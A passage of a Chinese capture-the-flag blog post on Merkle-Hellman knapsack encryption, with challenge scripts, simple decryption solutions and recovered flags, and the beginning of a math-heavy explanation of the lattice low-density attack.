id="背包加密相关论文"><a class="markdownIt-Anchor" href="#背包加密相关论文"></a> 背包加密相关论文</h2><ul><li>论文如下：</li></ul><div class="row">    <embed src="merkle1978.pdf" width="100%" height="550" type="application/pdf"></div><h1 id="基础题型"><a class="markdownIt-Anchor" href="#基础题型"></a> 基础题型</h1><h2 id="题目1_basectf2024__babypack"><a class="markdownIt-Anchor" href="#题目1_basectf2024__babypack"></a> 题目1_BaseCTF2024__babypack</h2><ul><li>题目来源：baseCTF2024</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag=<span class="string">b&#x27;BaseCTF&#123;&#125;&#x27;</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">bin_m=<span class="built_in">bin</span>(m)[<span class="number">2</span>:]</span><br><span class="line">length=<span class="built_in">len</span>(bin_m)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">sum</span>=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):</span><br><span class="line">    temp=random.randint(<span class="number">2</span>*<span class="built_in">sum</span>+<span class="number">1</span>,<span class="number">4</span>*<span class="built_in">sum</span>)</span><br><span class="line">    <span class="built_in">sum</span>=<span class="built_in">sum</span>+temp</span><br><span class="line">    a.append(temp)</span><br><span class="line"></span><br><span class="line">a=a[::-<span class="number">1</span>]</span><br><span class="line">c=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    <span class="keyword">if</span> bin_m[i]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        c=c+a[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a=&quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure><ul><li>这题就是基本的<code>Merkle-Hellman背包加密算法</code>中的解密过程</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = []</span><br><span class="line">c = <span class="number">2488656295807929935404316556194747314175977860755594014838879551525915558042003735363919054632036359039039831854134957725034750353847782168033537523854288427613513938991943920607437000388885418821419115067060003426834</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> c &gt;= a[i]:</span><br><span class="line">        m+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        c-=a[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">m = <span class="built_in">int</span>(m,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;BaseCTF&#123;2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="题目2_moectf2022__miniminibackpack"><a class="markdownIt-Anchor" href="#题目2_moectf2022__miniminibackpack"></a> 题目2_MoeCTF2022__MiniMiniBackPack</h2><ul><li><a href="https://www.nssctf.cn/problem/3296">[MoeCTF 2022]MiniMiniBackPack | NSSCTF</a></li><li>题目附件是这样的：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">size</span>):</span><br><span class="line">    s = <span class="number">1000</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        a = random.randint(s + <span class="number">1</span>, <span class="number">2</span> * s)</span><br><span class="line">        <span class="keyword">assert</span> a &gt; <span class="built_in">sum</span>(key)</span><br><span class="line">        key.append(a)</span><br><span class="line">        s += a</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">L = <span class="built_in">len</span>(<span class="built_in">bin</span>(m)[<span class="number">2</span>:])</span><br><span class="line">key = gen_key(L)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">    c += key[i]**(m&amp;<span class="number">1</span>)</span><br><span class="line">    m &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>解密脚本与题目1的一样</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a =</span><br><span class="line">c =</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> c &gt;= a[i]:</span><br><span class="line">        m +=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        c -=a[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m,<span class="number">2</span>)))</span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;Co#gRa7u1at1o^s_yOu_c6n_d3c0de_1t&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="格攻击低密度攻击"><a class="markdownIt-Anchor" href="#格攻击低密度攻击"></a> 格攻击(低密度攻击)</h1><h2 id="攻击介绍"><a class="markdownIt-Anchor" href="#攻击介绍"></a> 攻击介绍</h2><p><strong>向量角度看背包加密</strong></p><ul><li>由于要使用格，我们就需要使用向量角度来进行背包加密的介绍。首先我们以n维向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>v</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{v}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span></span></span></span>表示明文v的二进制序列。写成向量的形式就如下。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>v</mi><mo>⃗</mo></mover><mo>=</mo><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>3</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>v</mi><mi>i</mi></msub><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\vec{v} = (v_1,v_2,v_3,...,v_n),v_i\in\{0,1\},(i=1,2,...,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><ul><li>背包加密的私钥，也就是一开始的这个超递增序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>a</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span></span></span></span>表示。写成向量的形式就如下图所示：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>a</mi><mo>⃗</mo></mover><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\vec{a} = (a_1,a_2,a_3,...,a_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><ul><li>然后生成模数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和乘数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>，使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{b}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9774399999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9774399999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span></span></span></span>表示公钥序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">b_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，所以公钥序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">b_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>写成向量的形式就是下面的这个式子：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>b</mi><mo>⃗</mo></mover><mo>=</mo><mi>w</mi><mover accent="true"><mi>a</mi><mo>⃗</mo></mover><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>=</mo><mo stretchy="false">(</mo><mi>w</mi><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>w</mi><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>w</mi><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>w</mi><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">\vec{b} = w\vec{a}~mod~p = (wa_1,wa_2,wa_3,...,wa_n)~mod~p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9774399999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9774399999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 